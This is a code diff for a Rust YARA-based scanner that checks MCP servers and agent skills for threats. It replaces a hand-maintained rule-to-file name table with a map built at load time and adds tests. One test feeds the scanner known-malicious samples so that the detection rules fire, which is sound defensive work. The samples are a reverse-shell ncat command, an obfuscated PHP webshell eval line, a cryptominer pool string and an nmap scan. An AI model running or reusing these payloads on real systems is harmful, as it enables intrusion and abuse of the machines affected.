@@ -28,43 +28,6 @@ type YaraRules = Rules;
 #[cfg(not(feature = "yara-x-scanning"))]
 type YaraRules = ();
 
-/// Map rule names to their file names for consistent naming
-fn rule_name_to_file_name(rule_name: &str) -> Option<String> {
-    match rule_name {
-        // secrets_leakage.yar rules
-        "SecretsLeakage" | "SSHKeyExposure" | "PEMFileAccess" | "EnvironmentVariableLeakage" => {
-            Some("secrets_leakage".to_string())
-        }
-        // cross_origin_escalation.yar rules
-        "CrossOriginEscalation"
-        | "CrossDomainContamination"
-        | "DomainOutlier"
-        | "MixedSecuritySchemes" => Some("cross_origin_escalation".to_string()),
-        // skill_prompt_injection.yar rules
-        "PromptInjectionSignature"
-        | "UnicodeSteganography"
-        | "CoerciveInjection"
-        | "IndirectPromptInjection" => Some("skill_prompt_injection".to_string()),
-        // skill_authority.yar rules
-        "AutonomyAbuse" | "CapabilityInflation" => Some("skill_authority".to_string()),
-        // skill_credential_harvesting.yar
-        "SkillCredentialHarvesting" => Some("skill_credential_harvesting".to_string()),
-        // skill_tool_chaining_abuse.yar
-        "SkillToolChainingExfiltration" => Some("skill_tool_chaining_abuse".to_string()),
-        // skill_system_manipulation.yar
-        "SkillSystemManipulation" => Some("skill_system_manipulation".to_string()),
-        // NOTE: agentskills.io validation findings (AgentskillsNameMismatch,
-        // AgentskillsInvalidName, AgentskillsMissingName,
-        // AgentskillsUnknownFrontmatterField) are NOT mapped here. They're
-        // synthesized in `src/skills.rs::make_heuristic_finding`, which
-        // hard-codes `rule_file = "skill_parser"` on construction; this
-        // mapping is only consulted for YARA-scan results, so any entry
-        // would be dead code. Same goes for the other skill heuristics
-        // (OverbroadAllowedTools, VagueSkillTrigger, etc.).
-        _ => None,
-    }
-}
-
 /// Generate descriptive context messages based on rule names
 fn generate_context_message(item_type: &str, rule_name: &str) -> String {
     match rule_name {
@@ -248,6 +211,10 @@ pub struct ThreatRules {
     post_scan_rules: Vec<Arc<YaraRules>>,
     rules_dir: String,
     rule_metadata: HashMap<String, RuleMetadata>,
+    /// YARA rule identifier → file stem of the .yar file it was loaded
+    /// from. Built at load time so new rule files dropped into
+    /// `rules/pre` or `rules/post` are mapped with no code changes.
+    rule_file_map: HashMap<String, String>,
     memory_usage_bytes: usize,
     last_load_time: std::time::Instant,
 }
@@ -285,6 +252,7 @@ impl ThreatRules {
             post_scan_rules: Vec::new(),
             rules_dir: rules_dir.to_string(),
             rule_metadata: HashMap::new(),
+            rule_file_map: HashMap::new(),
             memory_usage_bytes: 0,
             last_load_time: start_time,
         }
@@ -299,6 +267,7 @@ impl ThreatRules {
             post_scan_rules: Vec::new(),
             rules_dir: rules_dir.to_string(),
             rule_metadata: HashMap::new(),
+            rule_file_map: HashMap::new(),
             memory_usage_bytes: 0,
             last_load_time: start_time,
         };
@@ -398,6 +367,14 @@ impl ThreatRules {
                             .and_then(|s| s.to_str())
                             .unwrap_or("unknown")
                             .to_string();
+
+                        // Record which file each compiled rule identifier came
+                        // from so scan results can report their rule_file
+                        // without a hand-maintained name table.
+                        for compiled_rule in rule.iter() {
+                            self.rule_file_map
+                                .insert(compiled_rule.identifier().to_string(), rule_name.clone());
+                        }
 
                         debug!("Loaded YARA-X rule: {} (phase: {})", path.display(), phase);
 
@@ -529,6 +506,19 @@ impl ThreatRules {
         Self::scan_with_rules_enhanced_internal(text, context, &self.post_scan_rules, "post")
     }
 
+    /// Maps a YARA rule identifier (yara-x's `Rule::identifier`) back to
+    /// the file stem of the .yar file it was loaded from. The map is built
+    /// at load time from the compiled rules, so any rule file dropped into
+    /// the rules directory is covered with no code changes.
+    ///
+    /// NOTE: synthetic findings (skill-parser heuristics like
+    /// `AgentskillsNameMismatch`, the baseline-diff `MCPConfigChanged`,
+    /// OSV's `VulnerableDependency`) never consult this — they hard-code
+    /// `rule_file` on construction.
+    pub fn rule_file_for(&self, rule_identifier: &str) -> Option<String> {
+        self.rule_file_map.get(rule_identifier).cloned()
+    }
+
     /// Gets statistics about loaded rules
     pub fn stats(&self) -> RuleStats {
         let mut pre_scan_rules = Vec::new();
@@ -608,6 +598,7 @@ impl Clone for ThreatRules {
             post_scan_rules: self.post_scan_rules.clone(),
             rules_dir: self.rules_dir.clone(),
             rule_metadata: self.rule_metadata.clone(),
+            rule_file_map: self.rule_file_map.clone(),
             memory_usage_bytes: self.memory_usage_bytes,
             last_load_time: self.last_load_time,
         }
@@ -658,8 +649,7 @@ impl YaraScanner {
 
                 // Store YARA results for each match with metadata
                 for match_info in enhanced_matches {
-                    let yara_result =
-                        Self::create_yara_result_with_metadata::<T>(item, &match_info);
+                    let yara_result = self.create_yara_result_with_metadata::<T>(item, &match_info);
                     results.push(yara_result);
                 }
             }
@@ -682,7 +672,11 @@ impl YaraScanner {
     }
 
     /// Create a YARA scan result with original rule metadata
-    fn create_yara_result_with_metadata<T>(item: &T, match_info: &YaraMatchInfo) -> YaraScanResult
+    fn create_yara_result_with_metadata<T>(
+        &self,
+        item: &T,
+        match_info: &YaraMatchInfo,
+    ) -> YaraScanResult
     where
         T: crate::security::BatchScannableItem,
     {
@@ -690,7 +684,7 @@ impl YaraScanner {
             target_type: T::item_type().to_string(),
             target_name: item.name().to_string(),
             rule_name: match_info.rule_name.clone(),
-            rule_file: rule_name_to_file_name(&match_info.rule_name),
+            rule_file: self.scanner.rule_file_for(&match_info.rule_name),
             matched_text: None,
             context: generate_context_message(T::item_type(), &match_info.rule_name),
             rule_metadata: match_info.metadata.clone(),
@@ -741,7 +735,7 @@ impl Scanner for YaraScanner {
                 for result in &tool_results {
                     triggered_rules.insert(result.rule_name.clone());
                     // Map YARA rule name back to file name for consistent comparison
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         // Fallback: use the rule name itself if no mapping found
@@ -750,7 +744,7 @@ impl Scanner for YaraScanner {
                 }
                 for result in &prompt_results {
                     triggered_rules.insert(result.rule_name.clone());
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         triggered_file_names.insert(result.rule_name.clone());
@@ -758,7 +752,7 @@ impl Scanner for YaraScanner {
                 }
                 for result in &resource_results {
                     triggered_rules.insert(result.rule_name.clone());
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         triggered_file_names.insert(result.rule_name.clone());
@@ -801,7 +795,7 @@ impl Scanner for YaraScanner {
                             .into_iter()
                             .map(|rule_name| {
                                 // Get the file name for this rule
-                                if let Some(file_name) = rule_name_to_file_name(&rule_name) {
+                                if let Some(file_name) = self.scanner.rule_file_for(&rule_name) {
                                     format!("{file_name}:{rule_name}")
                                 } else {
                                     rule_name
@@ -846,7 +840,7 @@ impl Scanner for YaraScanner {
 
                 for result in &tool_results {
                     triggered_rules.insert(result.rule_name.clone());
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         triggered_file_names.insert(result.rule_name.clone());
@@ -854,7 +848,7 @@ impl Scanner for YaraScanner {
                 }
                 for result in &prompt_results {
                     triggered_rules.insert(result.rule_name.clone());
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         triggered_file_names.insert(result.rule_name.clone());
@@ -862,7 +856,7 @@ impl Scanner for YaraScanner {
                 }
                 for result in &resource_results {
                     triggered_rules.insert(result.rule_name.clone());
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         triggered_file_names.insert(result.rule_name.clone());
@@ -905,7 +899,7 @@ impl Scanner for YaraScanner {
                             .into_iter()
                             .map(|rule_name| {
                                 // Get the file name for this rule
-                                if let Some(file_name) = rule_name_to_file_name(&rule_name) {
+                                if let Some(file_name) = self.scanner.rule_file_for(&rule_name) {
                                     format!("{file_name}:{rule_name}")
                                 } else {
                                     rule_name
@@ -1783,7 +1777,7 @@ impl MCPScanner {
                                 .clone()
                                 .unwrap_or_else(|| server.to_display_url()),
                             rule_name: m.rule_name.clone(),
-                            rule_file: rule_name_to_file_name(&m.rule_name),
+                            rule_file: engine.rule_file_for(&m.rule_name),
                             matched_text: None,
                             context: generate_context_message("server", &m.rule_name),
                             rule_metadata: m.metadata.clone(),
@@ -2706,6 +2700,95 @@ mod tests {
             // Real YARA-X may or may not have matches depending on rule content
             // Just verify we got a valid result (empty or with matches)
         }
+    }
+
+    /// The rule-identifier → file-stem map is built at load time from the
+    /// compiled rules, so every .yar file in rules/pre is covered without
+    /// a hand-maintained name table. One representative rule per file
+    /// guards against a file silently failing to compile (the loader
+    /// warns and skips on compile errors instead of failing the load).
+    #[test]
+    #[cfg(feature = "yara-x-scanning")]
+    fn test_rule_file_map_covers_all_pre_rule_files() {
+        let scanner = ThreatRules::new("rules")
+            .expect("Should be able to create ThreatRules with rules directory");
+
+        for (rule_identifier, file_stem) in [
+            ("SecretsLeakage", "secrets_leakage"),
+            ("CommandInjection", "command_injection"),
+            ("SQLInjection", "sql_injection"),
+            ("PathTraversalVulnerability", "path_traversal"),
+            ("MCPConfigRisk", "mcp_config_risk"),
+            ("CrossOriginEscalation", "cross_origin_escalation"),
+            ("PromptInjectionSignature", "skill_prompt_injection"),
+            ("AutonomyAbuse", "skill_authority"),
+            ("SkillCredentialHarvesting", "skill_credential_harvesting"),
+            ("SkillToolChainingExfiltration", "skill_tool_chaining_abuse"),
+            ("SkillSystemManipulation", "skill_system_manipulation"),
+            ("CryptoStratumProtocol", "cryptominers"),
+            ("ReverseShell", "malware"),
+            ("PHPWebshellGeneric", "webshells"),
+            ("OffensiveToolReferences", "hacktools"),
+        ] {
+            assert_eq!(
+                scanner.rule_file_for(rule_identifier),
+                Some(file_stem.to_string()),
+                "rule {rule_identifier} should map to file {file_stem}"
+            );
+        }
+
+        // Synthetic findings never go through the YARA scan path and are
+        // intentionally absent from the map.
+        assert_eq!(scanner.rule_file_for("MCPConfigChanged"), None);
+    }
+
+    /// Loads the real shipped `rules/pre` files and confirms they fire on
+    /// known-malicious payloads. The other YARA tests scan inline synthetic
+    /// rules, so they prove the engine works but not that the shipped rule
+    /// content is correct — a broken regex in e.g. `cryptominers.yar` would
+    /// pass every other test. This guards the rule bodies themselves, with
+    /// extra coverage for the ported SkillSpector-derived rules.
+    #[test]
+    #[cfg(feature = "yara-x-scanning")]
+    fn test_shipped_pre_rules_fire_on_malicious_payloads() {
+        let scanner = ThreatRules::new("rules")
+            .expect("Should be able to create ThreatRules with rules directory");
+
+        // (payload, rule identifier that must appear in the matches)
+        let cases = [
+            (
+                "stratum+tcp://pool.minexmr.com:4444 -u WALLET -p x",
+                "CryptoStratumProtocol",
+            ),
+            ("pool: pool.minexmr.com", "CryptoMiningPools"),
+            (
+                "<?php eval(base64_decode($_POST['cfg'])); ?>",
+                "PHPWebshellObfuscated",
+            ),
+            ("ncat 10.0.0.5 4444 -e /bin/bash", "ReverseShell"),
+            ("nmap -sS 10.0.0.0/24", "OffensiveToolReferences"),
+        ];
+
+        for (payload, expected_rule) in cases {
+            let matches = scanner.pre_scan(payload, "test");
+            assert!(
+                matches.iter().any(|m| m.rule_name == expected_rule),
+                "payload {payload:?} should trigger {expected_rule}; got: {:?}",
+                matches.iter().map(|m| &m.rule_name).collect::<Vec<_>>()
+            );
+        }
+
+        // Benign skill prose must not trip any pre-scan rule.
+        let benign = "This skill helps you format markdown tables and tidy whitespace.";
+        let benign_matches = scanner.pre_scan(benign, "test");
+        assert!(
+            benign_matches.is_empty(),
+            "benign text should not match any rule; got: {:?}",
+            benign_matches
+                .iter()
+                .map(|m| &m.rule_name)
+                .collect::<Vec<_>>()
+        );
     }
 
     #[test]
